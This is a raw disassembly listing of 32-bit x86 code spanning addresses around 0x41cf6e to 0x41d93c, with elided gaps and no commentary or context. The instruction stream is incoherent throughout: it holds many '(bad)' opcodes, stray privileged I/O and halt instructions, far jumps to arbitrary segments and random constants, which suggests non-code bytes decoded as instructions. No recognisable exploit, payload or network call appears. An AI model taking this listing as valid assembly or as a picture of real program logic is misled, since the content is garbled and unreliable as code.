  41cf6e:	xchg   ebp,eax
  41cf6f:	std    
  41cf70:	rcl    BYTE PTR [edi+eax*2],1
  41cf73:	stos   DWORD PTR es:[edi],eax
  41cf74:	test   DWORD PTR [eax+0x60],ebp
  41cf77:	jbe    0x41cff0
  41cf79:	xor    edi,DWORD PTR [edi+edi*4-0x25]
  41cf7d:	jge    0x41cf08
  41cf7f:	pop    ds
  41cf80:	in     al,dx
  41cf81:	ds stc 
  41cf83:	popf   
  41cf84:	jge    0x41cf08
  41cf86:	ss push ebp
  41cf88:	popa   
  41cf89:	mov    ds:0xa383660e,al
  41cf8e:	enter  0x5c14,0x81
  41cf92:	adc    eax,0x582b6579
  41cf97:	adc    ebx,esi
  41cf99:	or     esp,eax
  41cf9b:	stos   DWORD PTR es:[edi],eax
  41cf9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cf9d:	cmp    al,BYTE PTR [ebx+edx*2+0x59]
  41cfa1:	sub    eax,0x8c6afc0b
  41cfa6:	adc    DWORD PTR [ebx+ecx*1-0x62d7e1b9],esi
  41cfad:	push   es
  41cfae:	cmp    BYTE PTR [esi-0x5b],cl
  41cfb1:	xor    eax,0x7301019
  41cfb6:	test   DWORD PTR [ebp-0x479278a4],esp
  41cfbc:	push   ss
  41cfbd:	push   edx
  41cfbe:	les    ecx,FWORD PTR [esi-0x1b409bc4]
  41cfc4:	sub    BYTE PTR [eax+edx*4+0x714bdadf],ah
  41cfcb:	mov    ch,0xf6
  41cfcd:	aam    0xe7
  41cfcf:	pushf  
  41cfd0:	inc    ebx
  41cfd1:	mov    esi,0x26b01244
  41cfd6:	js     0x41d037
  41cfd8:	mov    ds:0x36dbe738,al
  41cfdd:	js     0x41cfc8
  41cfdf:	ffree  st(4)
  41cfe1:	and    dl,BYTE PTR [ecx-0x32]
  41cfe4:	jo     0x41d023
  41cfe6:	push   cs
  41cfe7:	(bad)  
  41cfe8:	mul    DWORD PTR [edx]
  41cfea:	jo     0x41cf98
  41cfec:	xor    eax,0x598d99d1
  41cff1:	mov    edx,0x3ea70e80
  41cff6:	mov    edi,0x51d1134d
  41cffb:	out    dx,al
  41cffc:	pop    es
  41cffd:	inc    ebx
  41cffe:	sub    DWORD PTR [ebp+0x3a2794a7],edx
  41d004:	repz ds loop 0x41d000
  41d008:	not    BYTE PTR [edi]
  41d00a:	in     eax,dx
  41d00b:	add    DWORD PTR [edi],esi
  41d00d:	pop    ebx
  41d00e:	test   al,0x4
  41d010:	cld    
  41d011:	imul   edi,DWORD PTR [esi],0xa7d20dfd
  41d017:	jl     0x41cfe6
  41d019:	aad    0xe4
  41d01b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d01c:	xor    eax,0xb2298b93
  41d021:	pop    ss
  41d022:	or     bl,BYTE PTR [esi]
  41d024:	int    0x5e
  41d026:	push   cs
  41d027:	hlt    
  41d028:	add    DWORD PTR [ecx-0x59],esp
  41d02b:	cmp    dh,al
  41d02d:	fstp   DWORD PTR [esi]
  41d02f:	inc    ecx
  41d030:	pop    ebx
  41d031:	xchg   ebx,eax
  41d032:	ja     0x41d08c
  41d034:	and    eax,0x7a5e2a7
  41d039:	sub    al,0xa3
  41d03b:	jno    0x41cfe5
  41d03d:	or     bl,ah
  41d03f:	xor    al,0x2c
  41d041:	cmovo  edx,DWORD PTR [ebp-0x497677f3]
  41d048:	(bad)  
  41d049:	clc    
  41d04a:	cmc    
  41d04b:	push   0x3639d8c0
  41d050:	inc    edx
  41d051:	fs js  0x41d09b
  41d054:	dec    ebp
  41d055:	inc    eax
  41d056:	ret    
  41d057:	daa    
  41d058:	inc    ecx
  41d059:	add    DWORD PTR [ecx-0x77],edx
  41d05c:	loopne 0x41d0bb
  41d05e:	and    al,BYTE PTR [esi-0x53]
  41d061:	mov    dh,BYTE PTR [ecx+0x42]
  41d064:	pop    ebp
  41d065:	sbb    bl,BYTE PTR ds:0x98aa406
  41d06b:	neg    DWORD PTR [ecx+0x0]
	...
  41d0d6:	mov    ecx,0xad432034
  41d0db:	push   edi
  41d0dc:	sti    
  41d0dd:	dec    BYTE PTR [esi-0x1b]
  41d0e0:	mov    ebp,0x781a9ebd
  41d0e5:	loopne 0x41d0ed
  41d0e7:	cmp    BYTE PTR [ecx],al
  41d0e9:	add    bh,bh
  41d0eb:	add    BYTE PTR [eax],al
  41d0ed:	add    BYTE PTR ds:0x2fbd45a0,bh
  41d0f3:	and    eax,0xbbb06f91
  41d0f8:	loope  0x41d156
  41d0fa:	xlat   BYTE PTR ds:[ebx]
  41d0fb:	call   0xe9a9890b
  41d100:	or     dl,ah
  41d102:	lods   al,BYTE PTR ds:[esi]
  41d103:	dec    esi
  41d104:	xchg   esp,eax
  41d105:	xchg   ebp,eax
  41d106:	in     eax,0xa5
  41d108:	jb     0x41d0d5
  41d10a:	mov    esi,0x3020b03e
  41d10f:	jge    0x41d136
  41d111:	cld    
  41d112:	mov    DWORD PTR ds:[edx+0x4d],edi
  41d116:	test   eax,0xce1a0d8a
  41d11b:	stos   DWORD PTR es:[edi],eax
  41d11c:	loopne 0x41d0dd
  41d11e:	aaa    
  41d11f:	jo     0x41d165
  41d121:	scas   al,BYTE PTR es:[edi]
  41d122:	fcmovnu st,st(4)
  41d124:	clc    
  41d125:	repnz inc ebp
  41d127:	dec    edx
  41d128:	retf   0xa86f
  41d12b:	jmp    0xdcba:0x4148932a
  41d132:	mov    ebx,0x5e5a42a5
  41d137:	cmp    esi,DWORD PTR [ebx-0x54a2b2d0]
  41d13d:	out    dx,eax
  41d13e:	fstp   DWORD PTR [eax+esi*4+0x29]
  41d142:	in     al,dx
  41d143:	test   BYTE PTR [ebx-0x519f5ffc],cl
  41d149:	adc    ebp,DWORD PTR [eax+0x2e]
  41d14c:	push   0xf5ad4e60
  41d151:	sahf   
  41d152:	fwait
  41d153:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d154:	sbb    ah,cl
  41d156:	inc    esi
  41d157:	mov    bh,0xf1
  41d159:	add    DWORD PTR [ecx+0x59f8f7fe],eax
  41d15f:	push   edx
  41d160:	fwait
  41d161:	sbb    dl,BYTE PTR [eax]
  41d163:	int    0xf4
  41d165:	loopne 0x41d18e
  41d167:	push   ecx
  41d168:	mov    ebp,0xd1f9fce8
  41d16d:	sbb    DWORD PTR [esi+eax*8+0x57],edx
  41d171:	stos   BYTE PTR es:[edi],al
  41d172:	(bad)  
  41d173:	mov    ds:0x5978a8a5,al
  41d178:	or     ch,al
  41d17a:	mov    dl,0xf3
  41d17d:	xlat   BYTE PTR ds:[ebx]
  41d17e:	mov    esp,0xa97ea051
  41d183:	jo     0x41d1a5
  41d185:	and    DWORD PTR ds:0x48609145,esp
  41d18b:	nop
  41d18c:	icebp  
  41d18d:	dec    edi
  41d18e:	arpl   ax,ax
  41d190:	sub    esp,DWORD PTR [ebp+0x40]
  41d193:	sub    ecx,DWORD PTR [edi-0x32]
  41d196:	inc    esp
  41d197:	mov    cl,0xcd
  41d199:	sub    dl,0x89
  41d19c:	push   edx
  41d19d:	bound  edi,QWORD PTR [esp+edx*8-0x33cbe4a2]
  41d1a4:	jg     0x41d1a7
  41d1a6:	mov    eax,0xe71bda19
  41d1ab:	dec    ebp
  41d1ac:	mov    ebx,0x54b692ec
  41d1b1:	ins    DWORD PTR es:[edi],dx
  41d1b2:	fdivrp st(4),st
  41d1b4:	dec    edi
  41d1b5:	jbe    0x41d22d
  41d1b7:	or     BYTE PTR ds:0x899ac52c,bl
  41d1bd:	in     al,dx
  41d1be:	das    
  41d1bf:	jg     0x41d1e2
  41d1c1:	inc    ebp
  41d1c2:	fwait
  41d1c3:	test   edi,edi
  41d1c5:	mov    ds:0x5e4cf6f2,al
  41d1ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d1cb:	cmp    al,0x7c
  41d1cd:	adc    BYTE PTR [edi-0x7d310621],cl
  41d1d3:	jmp    0xcc0c52b1
  41d1d8:	loope  0x41d1c2
  41d1da:	repnz or eax,0x83cfbe00
  41d1e0:	inc    ebx
  41d1e1:	sti    
  41d1e2:	and    DWORD PTR [esi+ecx*2+0x4176cc14],edx
  41d1e9:	(bad)  
  41d1ea:	dec    ch
  41d1ec:	ja     0x41d1ee
	...
  41d256:	push   eax
  41d257:	ret    
  41d258:	cmp    ecx,DWORD PTR ds:0xdf76fdbb
  41d25e:	xor    DWORD PTR [ebp-0x7],esp
  41d261:	hlt    
  41d262:	in     al,0xe9
  41d264:	pop    ds
  41d265:	sbb    eax,DWORD PTR ds:0xff000139
  41d26b:	add    BYTE PTR [eax],al
  41d26d:	add    ah,ch
  41d26f:	out    0xf0,al
  41d271:	mov    dh,0x5a
  41d273:	push   es
  41d274:	fbstp  TBYTE PTR [ebp+0x1c1cf794]
  41d27a:	mov    ah,0xb6
  41d27c:	sbb    al,0xb9
  41d27e:	mov    esp,0xb1fe1002
  41d283:	sbb    bl,BYTE PTR [edi]
  41d285:	mov    ah,0x5c
  41d287:	or     edx,ecx
  41d289:	pop    es
  41d28a:	outs   dx,BYTE PTR ds:[esi]
  41d28b:	and    eax,0xcec0debf
  41d290:	push   0xffffffd9
  41d292:	xor    al,0x54
  41d294:	sub    al,ch
  41d296:	jne    0x41d2bb
  41d298:	pop    ecx
  41d299:	sbb    DWORD PTR [ebp+0x46a8026c],0xffffffa5
  41d2a0:	xor    al,0x74
  41d2a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d2a3:	or     BYTE PTR [edi+0x60bd4c7b],ch
  41d2a9:	clc    
  41d2aa:	shl    esp,cl
  41d2ac:	retf   0x4954
  41d2af:	lea    esi,[eax+0x354fc4c2]
  41d2b5:	daa    
  41d2b6:	push   ebp
  41d2b7:	xchg   esi,eax
  41d2b8:	imul   BYTE PTR [edx-0x8573043]
  41d2be:	inc    ebp
  41d2bf:	mov    edx,0xc1a7a852
  41d2c4:	call   0x8c7181da
  41d2c9:	pop    ds
  41d2ca:	stc    
  41d2cb:	push   0xa0ddf2c4
  41d2d0:	cmp    eax,0xa466a338
  41d2d5:	sbb    BYTE PTR [edx-0xd0f3ec],bl
  41d2db:	paddq  mm7,QWORD PTR [edi]
  41d2de:	mov    ebx,0x26b00ed0
  41d2e3:	sub    ch,bl
  41d2e5:	mov    edi,0x79990549
  41d2ea:	mov    cl,0x87
  41d2ec:	sub    BYTE PTR [esi+0x13],dl
  41d2ef:	push   0x5240b600
  41d2f4:	cmp    al,BYTE PTR [ecx]
  41d2f6:	xlat   BYTE PTR ds:[ebx]
  41d2f7:	ja     0x41d30c
  41d2f9:	outs   dx,DWORD PTR ds:[esi]
  41d2fa:	cwde   
  41d2fb:	ja     0x41d37a
  41d2fd:	(bad)  
  41d2fe:	ja     0x41d31f
  41d300:	rol    DWORD PTR [edi-0x7c],0x82
  41d304:	nop
  41d305:	sbb    ebx,DWORD PTR [esp+ebx*1-0x286bb99b]
  41d30c:	pop    es
  41d30d:	test   DWORD PTR [esi],ebp
  41d30f:	xchg   DWORD PTR [ebx],ebx
  41d311:	cmp    BYTE PTR [edi],bl
  41d313:	ins    DWORD PTR es:[edi],dx
  41d314:	xor    edi,ebx
  41d316:	jle    0x41d346
  41d318:	test   eax,0x65fd2aa8
  41d31d:	stos   DWORD PTR es:[edi],eax
  41d31e:	or     BYTE PTR [edx+0x3c],0x18
  41d322:	lods   eax,DWORD PTR ds:[esi]
  41d323:	xchg   ecx,eax
  41d324:	jbe    0x41d32f
  41d326:	jg     0x41d2d9
  41d328:	mov    al,ds:0xce6637c5
  41d32d:	(bad)  
  41d32e:	int3   
  41d32f:	cdq    
  41d330:	fwait
  41d331:	mov    ds:0x895b5e59,al
  41d336:	fdiv   QWORD PTR [eax+0x4c521415]
  41d33c:	mov    edx,0x98d394ea
  41d341:	mov    edi,0xd70e8d16
  41d346:	(bad)  
  41d347:	xor    cl,BYTE PTR [eax+0x7]
  41d34a:	js     0x41d398
  41d34c:	pop    edi
  41d34d:	sbb    DWORD PTR [ecx-0x51],edi
  41d350:	sahf   
  41d351:	pushf  
  41d352:	in     al,0xfd
  41d354:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d355:	sub    eax,0x1d81b837
  41d35a:	inc    ebp
  41d35b:	mov    esi,0x3fd525f0
  41d360:	rcr    edx,cl
  41d362:	dec    eax
  41d363:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d364:	fsubp  st(3),st
  41d366:	test   BYTE PTR [edx+edx*4],dl
  41d369:	es xor ah,ch
  41d36c:	mov    ch,0x0
	...
  41d3d6:	inc    BYTE PTR [eax+0x7dff54f9]
  41d3dc:	jmp    FWORD PTR [edx+0x69c02f8d]
  41d3e2:	ds cwde 
  41d3e4:	aas    
  41d3e5:	mov    esp,0x13a04
  41d3ea:	inc    DWORD PTR [eax]
  41d3ec:	add    BYTE PTR [eax],al
  41d3ee:	test   ebx,eax
  41d3f0:	sub    al,0xdd
  41d3f2:	lock ja 0x41d396
  41d3f5:	into   
  41d3f6:	das    
  41d3f7:	aaa    
  41d3f8:	popa   
  41d3f9:	retf   
  41d3fa:	sahf   
  41d3fb:	mov    ds:0x6b8d7c8e,eax
  41d400:	inc    ecx
  41d401:	es dec ecx
  41d403:	sar    BYTE PTR [edi+0x14],1
  41d406:	(bad)  [ecx+0x7686fc67]
  41d40c:	pop    ecx
  41d40d:	add    al,0x1f
  41d40f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d410:	mov    esp,0x99ba6a37
  41d415:	popa   
  41d416:	cwde   
  41d417:	xchg   esp,eax
  41d418:	cmp    BYTE PTR [ebp+esi*8+0x52baf47b],dl
  41d41f:	dec    ecx
  41d420:	stos   BYTE PTR es:[edi],al
  41d421:	rcr    cl,cl
  41d423:	rol    ch,0xd9
  41d426:	aam    0x44
  41d428:	prefetch BYTE PTR [ebx-0x3c]
  41d42c:	pusha  
  41d42d:	icebp  
  41d42e:	ins    BYTE PTR es:[edi],dx
  41d42f:	xchg   ecx,eax
  41d430:	out    0x33,eax
  41d432:	mov    ch,0xd0
  41d434:	pop    edx
  41d435:	push   ebx
  41d436:	ja     0x41d475
  41d438:	test   DWORD PTR [eax],edx
  41d43a:	loope  0x41d440
  41d43c:	pop    edx
  41d43d:	popa   
  41d43e:	sahf   
  41d43f:	or     DWORD PTR cs:[eax],edi
  41d442:	mov    ah,BYTE PTR [eax]
  41d444:	bound  ecx,QWORD PTR [ebx+0x787e1310]
  41d44a:	(bad)  
  41d44b:	(bad)  
  41d44c:	push   edi
  41d44d:	idiv   BYTE PTR [ebx-0x7fe91084]
  41d453:	push   esi
  41d454:	(bad)  
  41d455:	mov    ch,0x9
  41d457:	add    al,0x86
  41d459:	mov    edi,0xc4631f00
  41d45e:	cmp    BYTE PTR [ebp+0x55],ah
  41d461:	jnp    0x41d404
  41d463:	and    eax,0x64e451e2
  41d468:	aas    
  41d469:	enter  0xc669,0x51
  41d46d:	xchg   edx,eax
  41d46e:	xor    eax,0xf512400
  41d473:	loope  0x41d42e
  41d475:	dec    edi
  41d476:	pop    esp
  41d477:	in     eax,dx
  41d478:	retf   0x957
  41d47b:	hlt    
  41d47c:	rcl    cl,1
  41d47e:	aad    0x5c
  41d480:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d481:	ret    
  41d482:	loope  0x41d477
  41d484:	add    DWORD PTR [ecx+0x41e138a],edx
  41d48a:	pop    edi
  41d48b:	jle    0x41d4c7
  41d48d:	mov    ebx,esi
  41d48f:	mov    bl,dh
  41d491:	(bad)  
  41d493:	or     ebx,DWORD PTR [esp+edi*2]
  41d496:	mov    ebx,0x5fac7250
  41d49b:	outs   dx,BYTE PTR ds:[esi]
  41d49c:	arpl   WORD PTR ds:0x5c294cb7,cx
  41d4a2:	js     0x41d4d9
  41d4a4:	cdq    
  41d4a5:	aas    
  41d4a6:	retf   
  41d4a7:	int    0x4c
  41d4a9:	xchg   ecx,ebp
  41d4ab:	mov    ah,0x28
  41d4ad:	test   al,0x57
  41d4af:	out    dx,eax
  41d4b0:	xchg   esi,eax
  41d4b1:	mov    edx,0x784ff880
  41d4b6:	scas   al,BYTE PTR es:[edi]
  41d4b7:	mov    esi,0x5cecea8e
  41d4bc:	cmp    esi,DWORD PTR [ebp-0x6f]
  41d4bf:	fsub   DWORD PTR [edi-0x2]
  41d4c2:	pop    ss
  41d4c3:	leave  
  41d4c4:	push   edx
  41d4c5:	popa   
  41d4c6:	mov    BYTE PTR fs:[eax+eax*4-0x75f9edb],al
  41d4ce:	push   cs
  41d4cf:	add    esp,DWORD PTR [eax+ebp*4+0x48]
  41d4d3:	ins    DWORD PTR es:[edi],dx
  41d4d4:	cld    
  41d4d5:	ins    BYTE PTR es:[edi],dx
  41d4d6:	sub    al,0x13
  41d4d8:	les    ebp,FWORD PTR [edx]
  41d4da:	mov    cl,BYTE PTR [esi]
  41d4dc:	scas   al,BYTE PTR es:[edi]
  41d4dd:	cmp    BYTE PTR [ecx+0x7c],dl
  41d4e0:	sbb    eax,0x3a4d968d
  41d4e5:	sbb    al,0xe0
  41d4e7:	ror    ebp,0xe5
  41d4ea:	xchg   DWORD PTR [edi],ebp
  41d4ec:	mov    ecx,0x0
	...
  41d555:	add    dh,dh
  41d557:	rcl    BYTE PTR ss:[edx+edx*8+0x7d76f6f4],cl
  41d55f:	nop
  41d560:	call   0x3f6:0x2ca96989
  41d567:	cmp    eax,DWORD PTR [ecx]
  41d569:	add    bh,bh
  41d56b:	add    BYTE PTR [eax],al
  41d56d:	add    BYTE PTR [ebx+0x563c4bbf],bh
  41d573:	push   edx
  41d574:	dec    eax
  41d575:	mov    ch,0x53
  41d577:	inc    eax
  41d578:	xchg   esp,eax
  41d579:	or     DWORD PTR [edi+0x40],ebp
  41d57c:	inc    ebp
  41d57d:	js     0x41d5e8
  41d57f:	daa    
  41d580:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d581:	sbb    DWORD PTR [eax],esp
  41d583:	dec    esp
  41d584:	sbb    ebx,ebp
  41d586:	xchg   DWORD PTR [ebp+0x5c133a],esp
  41d58c:	das    
  41d58d:	fmul   QWORD PTR [esi+0x6f50c698]
  41d593:	les    esi,FWORD PTR [ebx+eax*4]
  41d596:	arpl   WORD PTR [edi],si
  41d598:	xor    ebp,DWORD PTR [esi]
  41d59a:	clc    
  41d59b:	imul   edx,DWORD PTR [edx-0x5c02075f],0x1
  41d5a2:	in     eax,0xf
  41d5a4:	iret   
  41d5a5:	popf   
  41d5a6:	adc    ecx,DWORD PTR [edx+0x53]
  41d5a9:	xor    ch,BYTE PTR [ebx+ebp*8-0x46]
  41d5ad:	mov    es,WORD PTR [ebx+0x6c]
  41d5b0:	sbb    DWORD PTR ds:0xf27f51de,ecx
  41d5b6:	sub    BYTE PTR [eax],bl
  41d5b8:	jb     0x41d5d8
  41d5ba:	mov    ds:0xeb8b900b,eax
  41d5bf:	mov    ebx,0x3243c3a8
  41d5c4:	mov    bl,0x9f
  41d5c6:	les    ebp,FWORD PTR [edx+0x516e7c1]
  41d5cc:	leave  
  41d5cd:	adc    esp,ebp
  41d5cf:	repz cmp BYTE PTR [ebx],bh
  41d5d2:	lock fistp DWORD PTR [ebx+0x7fd0cce8]
  41d5d9:	shl    edi,0xd0
  41d5dc:	clc    
  41d5dd:	xchg   ebx,eax
  41d5de:	and    ebp,DWORD PTR [edx]
  41d5e0:	jmp    0x41d60e
  41d5e2:	add    eax,0x6d692389
  41d5e8:	stos   DWORD PTR es:[edi],eax
  41d5e9:	fs ins DWORD PTR es:[edi],dx
  41d5eb:	xor    bh,BYTE PTR [ecx+0x6]
  41d5ee:	rcr    BYTE PTR [edx-0x424e46a3],0x3
  41d5f5:	jmp    0x91e6:0x24deb0b7
  41d5fc:	jae    0x41d5c5
  41d5fe:	jb     0x41d662
  41d600:	shl    BYTE PTR [esi],1
  41d602:	cmp    dh,BYTE PTR [esi]
  41d604:	push   esp
  41d605:	xor    BYTE PTR [esi],dh
  41d607:	mov    al,ds:0x4c386c16
  41d60c:	aad    0xce
  41d60e:	lock enter 0x58c0,0xcb
  41d613:	sbb    DWORD PTR [esi-0x10e28af],0xffffffaa
  41d61a:	xor    ebx,DWORD PTR [esi+ebx*4+0x3af49747]
  41d621:	and    DWORD PTR [ecx-0x51ce6f01],0xe11501fa
  41d62b:	pop    edi
  41d62c:	in     al,dx
  41d62d:	jnp    0x41d5cd
  41d62f:	xchg   edx,eax
  41d630:	jmp    0x41d62b
  41d632:	lods   eax,DWORD PTR ds:[esi]
  41d633:	sub    al,0x71
  41d635:	mov    dl,0x3e
  41d637:	and    BYTE PTR [ecx],bl
  41d639:	inc    ebp
  41d63a:	sub    cl,BYTE PTR [esi+0x1ac94eb9]
  41d640:	pop    edx
  41d641:	push   ebx
  41d642:	ds push es
  41d644:	cmp    eax,0x555f0468
  41d649:	sbb    bh,ch
  41d64b:	ret    
  41d64c:	push   ss
  41d64d:	aaa    
  41d64e:	mov    DWORD PTR [ebx-0x2fa438f6],esi
  41d654:	idiv   BYTE PTR [ebp-0x18]
  41d657:	pop    eax
  41d658:	dec    ebp
  41d659:	jnp    0x41d6c7
  41d65b:	push   esi
  41d65c:	out    0xdc,eax
  41d65e:	in     eax,0xd0
  41d660:	dec    esi
  41d661:	and    DWORD PTR [eax-0x6d],edx
  41d664:	push   DWORD PTR [edi+eax*2-0x7af494f6]
  41d66b:	inc    esp
  41d66c:	adc    eax,0x0
	...
  41d6d5:	add    BYTE PTR [ecx+ebx*4+0x4c],bh
  41d6d9:	jbe    0x41d6c8
  41d6db:	idiv   DWORD PTR [esi-0x65]
  41d6de:	or     eax,0x5166e435
  41d6e3:	std    
  41d6e4:	pop    esi
  41d6e5:	mov    ds:0x13c02,al
  41d6ea:	inc    DWORD PTR [eax]
  41d6ec:	add    BYTE PTR [eax],al
  41d6ee:	int    0x3
  41d6f0:	mov    ebx,0x3d3ade5f
  41d6f5:	push   ecx
  41d6f6:	imul   ecx
  41d6f8:	imul   esi,ebp,0x1d
  41d6fb:	inc    edx
  41d6fc:	pop    edx
  41d6fd:	outs   dx,DWORD PTR ds:[esi]
  41d6fe:	add    eax,0xb778f96c
  41d703:	adc    al,0x11
  41d705:	jg     0x41d770
  41d707:	push   ds
  41d708:	xchg   BYTE PTR [esi+0x38efebb5],ch
  41d70e:	xchg   esi,eax
  41d70f:	test   al,0x6d
  41d711:	xchg   ecx,eax
  41d712:	push   es
  41d713:	mov    bl,0xa7
  41d715:	pop    eax
  41d716:	or     ecx,edi
  41d718:	jnp    0x41d6e0
  41d71a:	xchg   BYTE PTR [ebx],cl
  41d71c:	dec    ebx
  41d71d:	mov    ah,0x4c
  41d71f:	lock popf 
  41d721:	ja     0x41d6ac
  41d723:	mov    al,0x91
  41d725:	xchg   edx,eax
  41d726:	mov    dl,cl
  41d728:	add    BYTE PTR [esi+0x621d0a25],cl
  41d72e:	(bad)  
  41d72f:	retf   
  41d730:	xor    eax,0xd64e2f8b
  41d735:	aas    
  41d736:	mov    edi,0xce6dfca5
  41d73b:	push   0x22208c37
  41d740:	ja     0x41d7ab
  41d742:	dec    ebp
  41d743:	out    0xc7,al
  41d745:	inc    eax
  41d746:	xor    eax,0x19753f65
  41d74b:	mov    cl,0x4e
  41d74d:	cmp    esp,esi
  41d74f:	test   dh,bl
  41d751:	pop    ebp
  41d752:	in     al,dx
  41d753:	adc    BYTE PTR [esi-0x23214e3b],cl
  41d759:	adc    ecx,DWORD PTR [edi-0x612be667]
  41d75f:	imul   BYTE PTR [ebx]
  41d761:	inc    edi
  41d762:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d763:	loopne 0x41d6f5
  41d765:	add    ecx,ecx
  41d767:	sub    BYTE PTR [ecx],bh
  41d769:	and    eax,0x798da212
  41d76e:	cli    
  41d76f:	push   0x7f
  41d771:	xchg   BYTE PTR [edx],ah
  41d773:	test   esi,eax
  41d775:	sbb    eax,0x48c81811
  41d77a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d77b:	cli    
  41d77c:	hlt    
  41d77d:	lahf   
  41d77e:	xor    eax,0x5f00e0cd
  41d783:	cmp    DWORD PTR [edx],esi
  41d785:	arpl   WORD PTR [edi],ax
  41d787:	push   es
  41d788:	fisubr DWORD PTR [ebx]
  41d78a:	stc    
  41d78b:	mov    eax,0xb7c3a0de
  41d790:	push   ds
  41d791:	fidivr DWORD PTR [ebx-0x30d761ac]
  41d797:	in     al,0xb
  41d799:	cwde   
  41d79a:	mov    edi,ss
  41d79c:	push   0xffffff94
  41d79e:	or     al,0xb0
  41d7a0:	mov    ecx,0x90f418aa
  41d7a5:	jg     0x41d770
  41d7a7:	push   edi
  41d7a8:	xor    BYTE PTR [edx],cl
  41d7aa:	leave  
  41d7ab:	int    0x2f
  41d7ad:	cmp    cl,dh
  41d7af:	push   ebp
  41d7b0:	fimul  WORD PTR [ebx-0x6ee261e9]
  41d7b6:	xor    al,0x7e
  41d7b8:	adc    DWORD PTR [edx],eax
  41d7ba:	inc    esp
  41d7bb:	fs int3 
  41d7bd:	xor    ch,bh
  41d7bf:	push   ds
  41d7c0:	retf   0x3a10
  41d7c3:	fst    QWORD PTR [ebp+0x21373f20]
  41d7c9:	xchg   edi,eax
  41d7ca:	xchg   ebx,eax
  41d7cb:	test   DWORD PTR [edx-0x3e],edi
  41d7ce:	mov    dl,ah
  41d7d0:	pusha  
  41d7d1:	cmp    BYTE PTR [ebp+0x5e],cl
  41d7d4:	or     eax,0xb282adc3
  41d7d9:	and    bl,BYTE PTR [edi+edx*2]
  41d7dc:	test   al,0xe
  41d7de:	mov    fs,WORD PTR [ecx-0x51]
  41d7e1:	loope  0x41d76c
  41d7e3:	rol    dl,cl
  41d7e5:	out    dx,eax
  41d7e6:	and    WORD PTR [ebp+0x13689fc8],di
	...
  41d855:	add    BYTE PTR [esi+ecx*8],ah
  41d858:	outs   dx,BYTE PTR ds:[esi]
  41d859:	sub    ch,dh
  41d85b:	stos   BYTE PTR es:[edi],al
  41d85c:	fs into 
  41d85e:	jmp    0x41d7eb
  41d860:	leave  
  41d861:	aas    
  41d862:	xor    al,0x26
  41d864:	inc    eax
  41d865:	push   ebp
  41d866:	add    DWORD PTR ds:0xff0001,edi
  41d86c:	add    BYTE PTR [eax],al
  41d86e:	push   esp
  41d86f:	stc    
  41d870:	cmp    edi,DWORD PTR [edx-0x376d560b]
  41d876:	jmp    0x7c6c:0x402dbc7a
  41d87d:	jno    0x41d81d
  41d87f:	enter  0x6eaf,0x36
  41d883:	int3   
  41d884:	cmp    BYTE PTR [ebx],0x0
  41d887:	mov    bl,0xc0
  41d889:	cs dec ebp
  41d88b:	(bad)  
  41d88c:	jmp    0x4702:0xb60d26a6
  41d893:	mov    ds:0x1baf5673,al
  41d898:	xchg   esi,eax
  41d899:	fnstenv [eax]
  41d89b:	mov    bl,0xa8
  41d89d:	mov    ebp,0x672ad98
  41d8a2:	mov    dh,0x2
  41d8a4:	cmp    al,0x2
  41d8a6:	inc    ecx
  41d8a7:	lahf   
  41d8a8:	in     al,dx
  41d8a9:	cwde   
  41d8aa:	or     al,0x88
  41d8ac:	xor    al,0x73
  41d8ae:	shr    ah,0xc1
  41d8b1:	pusha  
  41d8b2:	gs (bad) 
  41d8b4:	and    ah,bh
  41d8b6:	mov    edi,0xdc412c05
  41d8bb:	into   
  41d8bc:	and    al,0x48
  41d8be:	ficomp DWORD PTR [ecx-0x4cd68af]
  41d8c4:	ror    DWORD PTR [edx-0x4a],0xb4
  41d8c8:	inc    ecx
  41d8c9:	(bad)  
  41d8cb:	inc    edx
  41d8cc:	inc    edx
  41d8cd:	jmp    0x58a28d15
  41d8d2:	or     BYTE PTR [edx-0x15],al
  41d8d5:	(bad)  
  41d8d6:	adc    bl,ch
  41d8d8:	pop    ds
  41d8d9:	js     0x41d8fe
  41d8db:	mov    dl,0x2a
  41d8dd:	mov    ecx,0xb89e9a7
  41d8e2:	(bad)  
  41d8e4:	cli    
  41d8e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d8e6:	fisubr DWORD PTR [ebx]
  41d8e8:	test   BYTE PTR [edx],0x1b
  41d8eb:	ret    
  41d8ec:	inc    ebx
  41d8ed:	shr    esi,1
  41d8ef:	fdivr  QWORD PTR [eax]
  41d8f1:	xor    al,0xa8
  41d8f3:	lock or BYTE PTR ds:[esi-0x6e61f4b5],dl
  41d8fb:	pop    eax
  41d8fc:	fist   WORD PTR [ebx+0x860c4f1]
  41d902:	sub    esp,DWORD PTR [edi+0x71]
  41d905:	mov    bh,0xd1
  41d908:	and    bl,bh
  41d90a:	retf   0xa6a4
  41d90d:	adc    al,0x9
  41d90f:	das    
  41d910:	int    0xb5
  41d912:	stos   DWORD PTR es:[edi],eax
  41d913:	retf   0x4da6
  41d916:	push   ds
  41d917:	sub    ah,BYTE PTR [edx]
  41d919:	sahf   
  41d91a:	and    al,0x76
  41d91c:	lods   eax,DWORD PTR ds:[si]
  41d91e:	mov    al,0xbb
  41d920:	push   ds
  41d921:	pop    ds
  41d922:	adc    al,0xd9
  41d924:	xor    al,0xf
  41d926:	xor    eax,0x71831a0d
  41d92b:	xor    DWORD PTR [eax-0x73],ecx
  41d92e:	sbb    bh,BYTE PTR [ebx-0x76]
  41d931:	scas   eax,DWORD PTR es:[edi]
  41d932:	add    DWORD PTR [esi],ebx
  41d934:	icebp  
  41d935:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d936:	ins    BYTE PTR es:[edi],dx
  41d937:	ds cmc 
  41d939:	jnp    0x41d98c
  41d93b:	scas   al,BYTE PTR es:[edi]
  41d93c:	sub    eax,0x33e2f2c4
